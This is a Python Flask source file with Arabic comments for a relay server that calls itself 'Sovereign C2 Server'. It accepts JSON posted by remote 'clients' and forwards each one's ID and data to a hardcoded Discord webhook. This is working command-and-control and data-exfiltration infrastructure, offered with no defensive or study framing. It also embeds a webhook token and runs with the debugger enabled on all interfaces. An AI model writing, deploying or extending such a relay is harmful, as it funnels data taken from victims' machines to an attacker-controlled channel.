# server.py - سيرفر وسيط يستقبل من العميل ويرسل إلى Discord
# تشغيل: python server.py

from flask import Flask, request, jsonify
import requests
import os
import json
from datetime import datetime

app = Flask(__name__)

# =====================================================================
# إعدادات Discord - ضع رابط الويب هوك الخاص بك هنا
# =====================================================================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475936688009252866/Ytum84whqesL_CHXK0raRgQQlDtahbLwvCsvQncGOYHqiWCCSEoaZEk9HHvM9W767bA4"

# =====================================================================
# سجل بسيط للعرض
# =====================================================================
def log(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

# =====================================================================
# إرسال إلى Discord
# =====================================================================
def send_to_discord(content, username="Sovereign C2"):
    try:
        data = {
            "content": content,
            "username": username
        }
        response = requests.post(DISCORD_WEBHOOK, json=data)
        if response.status_code == 204 or response.status_code == 200:
            log(f"✅ تم الإرسال إلى Discord: {content[:50]}...")
            return True
        else:
            log(f"❌ فشل الإرسال إلى Discord: {response.status_code}")
            return False
    except Exception as e:
        log(f"❌ خطأ في الإرسال: {e}")
        return False

# =====================================================================
# نقطة النهاية الرئيسية - يستقبل من العميل
# =====================================================================
@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        # استقبال البيانات
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data"}), 400
        
        # استخراج المعلومات
        client_id = data.get('id', 'unknown')
        content = data.get('content', 'No content')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        
        # تسجيل في الكونسول
        log(f"📥 استقبال من {client_id}")
        
        # تحضير رسالة Discord
        discord_msg = f"**📡 استقبال من العميل**\n"
        discord_msg += f"```\n"
        discord_msg += f"العميل: {client_id}\n"
        discord_msg += f"الوقت: {timestamp}\n"
        discord_msg += f"البيانات: {content}\n"
        discord_msg += f"```"
        
        # إرسال إلى Discord
        send_to_discord(discord_msg)
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        log(f"❌ خطأ: {e}")
        return jsonify({"error": str(e)}), 500

# =====================================================================
# صفحة رئيسية للتأكد من أن السيرفر يعمل
# =====================================================================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "server": "Sovereign C2 Server",
        "time": datetime.now().isoformat(),
        "endpoint": "/api/data (POST)"
    })

# =====================================================================
# تشغيل السيرفر
# =====================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    log(f"🚀 تشغيل السيرفر على المنفذ {port}")
    log(f"📡 Discord Webhook: {DISCORD_WEBHOOK[:50]}...")
    log(f"📍 نقطة النهاية: http://localhost:{port}/api/data")
    app.run(host='0.0.0.0', port=port, debug=True)
